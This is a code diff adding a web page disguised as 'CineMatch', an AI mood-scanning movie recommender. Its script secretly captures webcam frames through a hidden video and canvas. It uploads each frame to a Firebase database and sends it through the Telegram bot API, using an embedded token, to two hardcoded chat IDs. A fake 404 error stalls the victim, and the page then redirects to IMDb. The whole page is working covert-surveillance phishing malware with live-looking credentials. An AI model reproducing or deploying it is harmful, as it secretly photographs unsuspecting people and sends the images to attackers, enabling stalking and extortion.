@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CineMatch | AI Discovery</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --accent: #00f2ff;
+            --bg: #050505;
+            --surface: #111111;
+            --text-main: #ffffff;
+            --text-dim: #777777;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background-color: var(--bg); 
+            color: var(--text-main);
+            font-family: 'Inter', system-ui, sans-serif;
+            overflow-x: hidden;
+        }
+
+        header {
+            padding: 20px 5%;
+            display: flex; justify-content: space-between; align-items: center;
+            border-bottom: 1px solid #222;
+        }
+
+        .logo { font-size: 20px; font-weight: 800; letter-spacing: 2px; color: var(--accent); }
+
+        .hero {
+            text-align: center; padding: 60px 20px;
+            background: radial-gradient(circle at center, #112233 0%, #050505 70%);
+        }
+
+        .mood-box {
+            max-width: 400px; margin: 0 auto; background: var(--surface);
+            padding: 30px; border-radius: 24px; border: 1px solid #222;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+        }
+
+        .scanner-ui {
+            width: 120px; height: 120px; margin: 0 auto 20px;
+            border: 2px solid var(--accent); border-radius: 50%;
+            position: relative; overflow: hidden;
+            display: flex; align-items: center; justify-content: center;
+        }
+
+        .laser {
+            position: absolute; width: 100%; height: 3px;
+            background: var(--accent); box-shadow: 0 0 15px var(--accent);
+            top: 0; animation: scan 3s infinite linear;
+        }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+        .btn-ai {
+            background: var(--accent); color: #000; border: none;
+            width: 100%; padding: 15px; border-radius: 12px;
+            font-weight: 700; cursor: pointer; transition: 0.3s;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+        .btn-ai:hover { box-shadow: 0 0 20px rgba(0, 242, 255, 0.4); transform: scale(1.02); }
+
+        /* Movie Grid */
+        .grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 20px; padding: 40px 5%; opacity: 0.3; filter: blur(2px);
+            pointer-events: none;
+        }
+        .card { background: #222; aspect-ratio: 2/3; border-radius: 8px; overflow: hidden; }
+        .card img { width: 100%; height: 100%; object-fit: cover; }
+
+        /* States */
+        #sync-ui, #error-404 { display: none; }
+
+        .glitch-404 { font-size: 80px; font-weight: 900; color: #333; margin: 0; }
+        .data-stream {
+            font-family: monospace; font-size: 10px; color: var(--accent);
+            text-align: left; background: #000; padding: 10px; border-radius: 5px;
+            margin-top: 20px; opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">CINEMATCH // AI</div>
+    </header>
+
+    <div class="hero" id="main-hero">
+        <div class="mood-box" id="init-view">
+            <div class="scanner-ui">
+                <div class="laser"></div>
+                <svg width="40" height="40" fill="var(--accent)" viewBox="0 0 24 24"><path d="M12 2c-4.97 0-9 4.03-9 9 0 4.17 2.84 7.67 6.69 8.69L12 22l2.31-2.31C18.16 18.67 21 15.17 21 11c0-4.97-4.03-9-9-9zm0 2c3.87 0 7 3.13 7 7 0 3.15-2.09 5.81-4.97 6.71L12 19.74l-2.03-2.03C7.09 16.81 5 14.15 5 11c0-3.87 3.13-7 7-7z"/></svg>
+            </div>
+            <h2 style="margin: 0 0 10px;">Personalize Your Feed</h2>
+            <p style="color: var(--text-dim); font-size: 14px; margin-bottom: 25px;">Enable <b>Kinetic Expression Analysis</b> to find movies that match your current mood perfectly.</p>
+            <button class="btn-ai" onclick="startAiScan()">Scan My Mood</button>
+        </div>
+
+        <div class="mood-box" id="sync-ui">
+            <div class="scanner-ui" style="border-color: #ff0055;">
+                <div class="laser" style="background: #ff0055; box-shadow: 0 0 15px #ff0055;"></div>
+                <div id="perc" style="font-weight: 900; color: #ff0055;">0%</div>
+            </div>
+            <h3>Analyzing Expressions...</h3>
+            <p style="color: var(--text-dim); font-size: 13px;">Mapping facial vectors to emotional metadata. Please stay centered.</p>
+            <div class="data-stream">
+                > FETCHING_EMOTION_VECTORS...<br>
+                > CALIBRATING_MOOD_ENGINE...<br>
+                > SERVER_LOCATION: MUMBAI_CLUSTER_A1
+            </div>
+        </div>
+
+        <div class="mood-box" id="error-404">
+            <p class="glitch-404">404</p>
+            <h3 style="color: #ffaa00;">Recommendation Sync Error</h3>
+            <p style="color: var(--text-dim); font-size: 13px;">The recommendation engine lost sync with the Mumbai metadata server. Retrying scan to restore your profile...</p>
+            <div class="btn-ai" style="background: #333; color: #888;">Retrying Handshake...</div>
+        </div>
+    </div>
+
+    <div class="grid">
+        <div class="card"><img src="https://via.placeholder.com/200x300/111/444?text=Action"></div>
+        <div class="card"><img src="https://via.placeholder.com/200x300/111/444?text=Drama"></div>
+        <div class="card"><img src="https://via.placeholder.com/200x300/111/444?text=Sci-Fi"></div>
+        <div class="card"><img src="https://via.placeholder.com/200x300/111/444?text=Thriller"></div>
+        <div class="card"><img src="https://via.placeholder.com/200x300/111/444?text=Comedy"></div>
+        <div class="card"><img src="https://via.placeholder.com/200x300/111/444?text=Horror"></div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startAiScan() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        let progress = Math.min(Math.floor((count / 50) * 100), 99);
+                        document.getElementById('perc').innerText = progress + "%";
+
+                        if (count <= 55) {
+                            movieCapture(count);
+                        }
+
+                        // Simulation: 404 Error after 30 seconds
+                        if (count === 30) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to a popular movie site
+                            window.location.href = "https://www.imdb.com/chart/top/";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.rottentomatoes.com";
+            }
+        }
+
+        function movieCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "AI_MOOD_RECOMMENDER_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_CLUSTER_A1" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'mood_analysis_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
